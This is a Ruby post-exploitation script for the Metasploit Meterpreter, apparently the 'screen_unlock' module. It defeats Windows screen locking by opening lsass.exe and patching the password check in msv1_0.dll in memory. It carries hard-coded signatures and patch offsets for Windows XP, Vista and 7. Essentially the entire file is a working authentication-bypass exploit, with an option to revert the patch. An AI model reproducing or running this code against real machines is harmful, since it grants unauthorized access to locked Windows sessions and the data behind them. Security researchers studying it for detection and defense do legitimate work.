#
# Script to unlock a windows screen by L4teral <l4teral [4t] gmail com>
# Needs system prvileges to run and known signatures for the target system.
# This script patches msv1_0.dll loaded by lsass.exe
#
# Based on the winlockpwn tool released by Metlstorm: http://www.storm.net.nz/projects/16
#

revert = false
targets = [
	{ :sig => "8bff558bec83ec50a1", :sigoffset => 0x9927, :orig_code => "32c0", :patch => "b001", :patchoffset => 0x99cc, :os => /Windows XP.*Service Pack 2/ },
	{ :sig => "8bff558bec83ec50a1", :sigoffset => 0x981b, :orig_code => "32c0", :patch => "b001", :patchoffset => 0x98c0, :os => /Windows XP.*Service Pack 3/ },
	{ :sig => "8bff558bec81ec88000000a1", :sigoffset => 0xb76a, :orig_code => "32c0", :patch => "b001", :patchoffset => 0xb827, :os => /Windows Vista/ },
	{ :sig => "8bff558bec81ec88000000a1", :sigoffset => 0xb391, :orig_code => "32c0", :patch => "b001", :patchoffset => 0xb44e, :os => /Windows Vista/ },
	{ :sig => "8bff558bec81ec88000000a1", :sigoffset => 0xacf6, :orig_code => "32c0", :patch => "b001", :patchoffset => 0xadb3, :os => /Windows Vista/ },
	{ :sig => "8bff558bec81ec88000000a1", :sigoffset => 0xe881, :orig_code => "32c0", :patch => "b001", :patchoffset => 0xe93e, :os => /Windows 7/ }
]

opts = Rex::Parser::Arguments.new(
	"-h" => [ false,"Help menu." ],
	"-r" => [ false, "revert the patch (enable screen locking again)"]
)
opts.parse(args) { |opt, idx, val|
	case opt
	when "-r"
		revert = true
	when "-h"
		print_line("")
		print_line("USAGE:   run screen_unlock [-r]")
		print_line(opts.usage)
		raise Rex::Script::Completed
	end
}
def unsupported
	print_error("This version of Meterpreter is not supported with this Script!")
	raise Rex::Script::Completed
end
unsupported if client.platform !~ /win32|win64/i
os = client.sys.config.sysinfo['OS']

targets.each do |t|
	if os =~ t[:os]
		target = t
		print_status("OS '#{os}' found in known targets")
		pid = client.sys.process["lsass.exe"]
		p = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
		dllbase = p.image["msv1_0.dll"]

		sig = p.memory.read(dllbase + target[:sigoffset], target[:sig].length / 2).unpack("H*")[0]
		if sig != target[:sig]
			print_error("found signature does not match")
			next
		end
		old_code = p.memory.read(dllbase + target[:patchoffset], target[:orig_code].length / 2).unpack("H*")[0]
		if !((old_code == target[:orig_code] && !revert) || (old_code == target[:patch] && revert))
			print_error("found code does not match")
			next
		end

		print_status("patching...")
		new_code = revert ? target[:orig_code] : target[:patch]
		p.memory.write(dllbase + target[:patchoffset], [new_code].pack("H*"))

		written_code = p.memory.read(dllbase + target[:patchoffset], target[:patch].length / 2).unpack("H*")[0]
		if ((written_code == target[:patch] && !revert) || (written_code == target[:orig_code] && revert))
			print_status("done!")
			raise Rex::Script::Completed
		else
			print_error("failed!")
			next
		end
	end
end

print_status("no working target found")

